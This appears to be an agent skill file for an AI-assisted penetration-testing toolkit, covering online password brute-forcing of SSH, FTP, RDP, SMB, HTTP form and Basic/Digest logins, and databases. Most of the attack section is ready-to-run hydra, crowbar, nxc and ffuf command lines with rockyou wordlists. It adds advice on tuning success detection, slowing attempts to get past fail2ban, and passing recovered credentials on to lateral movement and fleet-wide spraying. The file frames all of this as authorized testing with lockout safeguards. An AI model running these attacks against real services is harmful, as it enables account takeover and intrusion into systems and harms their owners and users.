---
name: online-password-attacks
description: >
  Online password brute-forcing / targeted guessing against authentication
  services — SSH, FTP, SMTP, RDP, SMB, HTTP form login, HTTP Basic/Digest,
  POP3/IMAP, MSSQL, MySQL. Covers Hydra, medusa, patator, and ffuf for
  form logins. Distinct from password-spraying: that is one password across
  many users; this is many passwords against few users on one service.
  OSCP Password Attacks module. For hash cracking use credential-recovery.
keywords:
  - online password attack
  - hydra
  - medusa
  - patator
  - ssh brute force
  - ftp brute force
  - rdp brute force
  - http form login brute
  - basic auth brute
  - ffuf login
  - OSCP password attacks
tools:
  - hydra
  - medusa
  - patator
  - ffuf
  - curl
opsec: high
---

# Online Password Attacks (Targeted Guessing)

You are helping a penetration tester test an authentication service's
resistance to online password guessing. All testing is under explicit
written authorization and against the pre-approved target in scope.
Online auth attacks are high-signal to defenders — honor lockout
policies and rate limits, and keep attempts within the operator's
authorized window.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[online-password-attacks] Activated → <target>:<port>/<service>` on activation.
- **Evidence** → save hydra/medusa output to
  `engagement/evidence/hydra-<service>-<target>-<ts>.txt`. If a hit
  lands, immediately message state-mgr `[add-cred]` with
  `source="hydra <service>"` and `via_vuln_id=<N>` where N is the
  technique's own vuln row.

## Scope Boundary

This skill covers ONLINE (service-connected) password attacks.
Offline hash cracking is `credential-recovery`. Fleet-wide
spraying of ONE password across MANY users is `password-spraying`
(different wordlist shape, different lockout profile). On a
confirmed hit (`login:password` validated), **STOP** and return —
do not pivot further on your own.

**Hard rule — honor lockout policy.** Before any online attack
against a Windows/AD service, confirm the lockout threshold with a
null-session or known-good credential policy read. If
`LockoutThreshold != 0`, limit per-user attempts to
`threshold - 2` with a reset window, or stop and hand to
`password-spraying` for the single-password-per-user profile.
Lock-outs are detectable, loud, and only a sysadmin can clear
them — a single misstep costs the engagement.

**Never attack production authentication endpoints that affect
real users** (customer login portals, internal SSO) outside the
operator's agreed test window.

## State Management

Call `get_state_summary()`. Check for:
- Existing credentials — reuse before brute-forcing
- Known usernames from recent enum (ad-enum / smb-ops / web-enum)
- Lockout policy if the operator captured one
- Blocked entries for the target+service — don't re-run a service
  that was already proven resistant

Report back:
- Service + port
- Username set used
- Wordlist used
- Attempts made
- Hits found
- Finding id

## Prerequisites

- Target service reachable and in `engagement/scope.allow`
- `hydra` / `medusa` / `patator` on the attackbox (standard
  Kali/Parrot install)
- Wordlists at `/usr/share/wordlists/` (seclists, rockyou,
  darkweb2017-top*.txt). Operator may name a specific wordlist in
  the scope document.
- A sanity-check known-good credential for the service (verify
  Hydra's success detection isn't broken by banners / wrappers)

## Attack Variants

### Variant A — SSH / FTP / SMTP / POP3 / IMAP / MSSQL / MySQL

Service-protocol modules in hydra are the default:

```bash
# SSH — the OSCP classic
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
      -t 4 -I -o engagement/evidence/hydra-ssh-<target>-<ts>.txt \
      ssh://<target>

# FTP
hydra -L users.txt -P passwords.txt -t 8 ftp://<target>

# MSSQL (default port 1433)
hydra -L users.txt -P passwords.txt mssql://<target>

# MySQL (default port 3306)
hydra -L users.txt -P passwords.txt mysql://<target>
```

**Thread budget**: `-t 4` for SSH (OpenSSH tar-pits at higher
concurrency), `-t 8-16` for FTP/MySQL/MSSQL. `-I` ignores a
previously-aborted restore file (set when retrying).

### Variant B — RDP (NLA + classic)

`hydra -t 1` only (RDP serializes auth). Prefer `crowbar` or
`xfreerdp` scripting when hydra's RDP module misdetects success:

```bash
# Classic RDP
hydra -L users.txt -P passwords.txt -t 1 -V rdp://<target>

# Alternative: crowbar (slower but reliable NLA)
crowbar -b rdp -s <target>/32 -U users.txt -C passwords.txt
```

### Variant C — SMB (be VERY careful with lockout)

```bash
# ONLY after confirming lockout threshold allows this
hydra -L users.txt -P passwords.txt -t 1 smb://<target>
```

Prefer `nxc smb <target> -u users.txt -p passwords.txt
--continue-on-success` with `--pass-pol` first to re-read the
policy. If the policy says `LockoutThreshold>0`, STOP and hand to
`password-spraying` with the policy context.

### Variant D — HTTP form login

Needs two pieces: the form POST shape and a success/failure
discriminator.

1. Capture a known-good login via browser-server or curl to see
   the exact body shape and success response.
2. Pick the discriminator — a string that appears ONLY on failure
   (e.g. "Invalid credentials") or ONLY on success (e.g. a
   redirect `302` to `/dashboard`).

```bash
# hydra http-post-form
hydra -L users.txt -P passwords.txt -t 10 \
      <target> http-post-form \
      "/login:username=^USER^&password=^PASS^:F=Invalid credentials"

# For success-string discriminator use S= instead of F=.
# For session-cookie-first flows that need a token, hydra won't
# work — use ffuf instead.
```

For CSRF-token-protected forms, use `ffuf` with a Python helper
that scrapes the token before each attempt, or capture a working
flow via `tools/ingestors/har_replay.py` and parameterize the
password field.

### Variant E — HTTP Basic / Digest auth

```bash
# Basic
hydra -L users.txt -P passwords.txt <target> http-get /protected
# Digest
hydra -L users.txt -P passwords.txt <target> http-get \
      /protected -m digest
```

## Verification Oracle

- **Confirmed credential**: the recovered `user:pass` logs into
  the service via a SECOND, independent client (e.g. ssh, winexe,
  smbclient — not hydra) and executes `whoami` / `id`.
- **Service-shape dependent**: for RDP, a screenshot of the
  logged-in desktop is the proof (rdp-server `rdp_connect` →
  `rdp_screenshot`); for SMB, `smbclient -L` with the credential.

Hydra reporting a hit is a **candidate**, not a confirmation — the
success detection has known false-positive patterns on servers
with unusual banners. Always validate with a second client.

## Post-Attack Exit

Write the finding to `engagement/findings/<id>.json`. Classification:
- CWE-307 (Improper Restriction of Excessive Authentication Attempts)
- CWE-521 (Weak Password Requirements) when the recovered password
  is weak
- OWASP A07 (Identification and Authentication Failures)
- MITRE ATT&CK: T1110.001 (Password Guessing)

STOP and return to the orchestrator with:
- Service + username + validation command
- Follow-ups the orchestrator may route:
  - SSH credential → lin-enum
  - SMB/WinRM credential → smb-ops (lateral movement) + spray
    (fan the cred across the fleet)
  - Web form credential → web-ops for post-auth testing
  - RDP credential → rdp-server for GUI access

## Troubleshooting

### Every attempt returns "success" (false positive storm)

Hydra's success detection is broken by this server's banner.
Switch discriminators (`F=` vs `S=`), tune the match string, or
switch to medusa / patator which have different detection logic.
If still broken, use a bash loop with `sshpass` or
`smbclient -c 'ls' //target/share -U user%pass` for
case-by-case validation.

### Rate limit kicks in / fail2ban blocks the attackbox

Expected on hardened services. Reduce `-t` to 1, add
`-W <seconds>` delay between attempts, and spread attempts
across time. If the operator's engagement is short, declare the
service "resistant" as a finding and move on — don't burn the
attackbox IP on fail2ban.

### No wordlist produces a hit after N attempts

The password isn't in the wordlist. Options:
1. Try a different list shape (seclists common-corporate /
   darkweb2017-top) if authorized.
2. Pivot to `password-spraying` with a known-good single
   password across the full user set.
3. Record negative finding and route back to the lead; may
   indicate the service is actually well-configured.
